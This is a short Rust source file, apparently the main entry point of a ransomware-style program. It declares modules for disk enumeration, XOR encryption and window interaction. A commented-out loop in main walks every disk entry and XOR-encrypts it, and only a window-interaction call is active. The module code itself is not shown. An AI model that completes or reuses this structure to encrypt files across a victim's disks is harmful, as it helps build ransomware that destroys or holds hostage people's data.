extern crate winapi;
mod XOR_encrypt;
mod disk_enum;
mod window_interact;
use disk_enum::disk_enum;
use XOR_encrypt::XOR_encrypt;
use window_interact::window_interact;

fn main() {
    unsafe {
        /*
        for entry in disk_enum() {
            XOR_encrypt(&entry);
        }*/
        window_interact();
    }
}
